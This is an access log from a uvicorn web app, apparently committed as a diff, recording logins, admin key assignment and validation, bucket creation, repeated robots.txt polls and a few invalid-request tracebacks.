+INFO:     41.142.126.155:23849 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50294 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50294 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24023 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:24023 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:23989 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50390 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50388 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24159 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50450 - "POST /admin/keys/1/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50450 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50506 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50506 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:24369 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24375 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:24557 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24561 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50536 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24757 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50566 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50584 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:24835 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:24857 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50594 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50602 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50594 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50602 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25045 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50608 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25045 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50608 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50608 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25085 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25093 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25085 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25093 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25205 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50636 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25243 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25325 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50654 - "POST /admin/users/create HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50654 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25327 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25327 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50668 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25327 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50676 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50672 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25479 - "POST /admin/keys/1/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25479 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25549 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25549 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50688 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50688 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50692 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50692 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50688 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50688 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50696 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50696 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50688 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50696 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50694 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50694 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50704 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50704 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50694 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50694 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50704 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25683 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50694 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25735 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25681 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25787 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50722 - "POST /admin/keys/1/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50722 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25897 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25897 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50728 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50730 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25913 - "POST /admin/keys/2/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25913 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25913 - "POST /admin/keys/3/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25913 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25913 - "POST /admin/keys/6/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25913 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25947 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:25913 - "POST /admin/keys/7/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25913 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:25913 - "POST /admin/keys/8/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:25913 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50736 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50736 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50736 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50736 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50734 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50734 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50742 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50742 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50734 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50734 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50742 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50742 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26013 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50746 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26077 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26131 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50750 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50756 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26217 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26277 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50766 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50766 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50770 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50770 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50766 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50766 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50770 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50770 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26351 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26383 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50772 - "POST /admin/keys/2/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50772 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50786 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50786 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50772 - "POST /admin/keys/2/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50772 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50786 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26437 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50778 - "POST /admin/keys/3/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50778 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26535 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26535 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50778 - "POST /admin/keys/3/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50778 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50794 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50794 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50778 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50778 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26565 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26565 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26532 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:26532 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26613 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:26613 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50800 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:26653 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50804 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50820 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50808 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27329 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27322 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50866 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50864 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27496 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27493 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27521 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50870 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27599 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50876 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50886 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27707 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50892 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27733 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27773 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50894 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50894 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27897 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27897 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50894 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50894 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27897 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27897 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50894 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27897 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27892 - "POST /admin/keys/1/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:27892 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50908 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50908 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27892 - "POST /admin/keys/2/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:27892 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27959 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27959 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27892 - "POST /admin/keys/3/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:27892 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27959 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27959 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50912 - "POST /admin/keys/4/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50912 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27991 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27991 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50912 - "POST /admin/keys/4/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50912 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:27991 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:27991 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50924 - "POST /admin/keys/5/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50924 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50926 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50926 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50924 - "POST /admin/keys/5/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50924 - "GET /admin/keys HTTP/1.1" 200 OK
+/root/s33_project/venv/lib64/python3.6/site-packages/boto3/compat.py:88: PythonDeprecationWarning: Boto3 will no longer support Python 3.6 starting May 30, 2022. To continue receiving service updates, bug fixes, and security updates please upgrade to Python 3.7 or later. More information can be found here: https://aws.amazon.com/blogs/developer/python-support-policy-updates-for-aws-sdks-and-tools/
+  warnings.warn(warning, PythonDeprecationWarning)
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     41.142.126.155:50926 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50928 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     41.142.126.155:28061 - "POST /admin/keys/6/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:28061 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:28121 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:28121 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50930 - "POST /admin/keys/6/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50930 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50932 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50932 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:28137 - "POST /admin/keys/15/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:28137 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50936 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50936 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:28217 - "POST /admin/keys/15/assign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:28217 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:28245 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:28245 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50944 - "POST /admin/keys/15/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50944 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50946 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50946 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50944 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50944 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50946 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50946 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50944 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:50944 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50946 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50948 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:28295 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:28353 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:50950 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50954 - "GET /robots.txt?488411 HTTP/1.1" 404 Not Found
+INFO:     196.77.117.43:15181 - "GET / HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15181 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     196.77.117.43:15181 - "GET / HTTP/1.1" 200 OK
+INFO:     196.77.117.43:55350 - "POST /login HTTP/1.1" 302 Found
+INFO:     196.77.117.43:55350 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     196.77.117.43:55350 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     196.77.117.43:55370 - "POST /admin/users/create HTTP/1.1" 302 Found
+INFO:     196.77.117.43:55370 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53378 - "POST /admin/users/create HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53378 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53383 - "POST /admin/users/create HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53383 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53390 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53390 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/15/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/14/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/13/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/13/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/12/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/11/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/10/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15193 - "POST /admin/keys/9/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15193 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53398 - "POST /admin/keys/8/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53398 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53398 - "POST /admin/keys/8/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53398 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53398 - "POST /admin/keys/7/validate HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53398 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53410 - "POST /admin/keys/6/unassign HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53410 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53416 - "POST /admin/keys/5/unassign HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53416 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:15195 - "POST /admin/keys/6/assign HTTP/1.1" 302 Found
+INFO:     196.77.117.43:15195 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53421 - "POST /admin/keys/7/assign HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53421 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     196.77.117.43:53423 - "POST /admin/keys/8/assign HTTP/1.1" 302 Found
+INFO:     196.77.117.43:53423 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     172.233.115.121:53930 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.121:53930 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     196.65.250.3:53758 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.111:49756 - "GET / HTTP/1.1" 200 OK
+INFO:     196.65.250.3:6865 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:49762 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:35702 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.121:35702 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:35712 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.121:35712 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.111:51854 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.111:51854 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.121:40912 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:52480 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:51582 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:52084 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:52084 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:46718 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.121:46718 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.121:47232 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:56230 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     52.167.144.58:18590 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     40.77.167.25:43995 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.111:33622 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.111:33622 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:44934 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:44950 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     40.77.167.5:25603 - "GET /login HTTP/1.1" 200 OK
+INFO:     97.107.131.57:38838 - "GET / HTTP/1.1" 200 OK
+INFO:     159.89.148.157:38820 - "GET / HTTP/1.0" 200 OK
+INFO:     172.233.115.121:44126 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
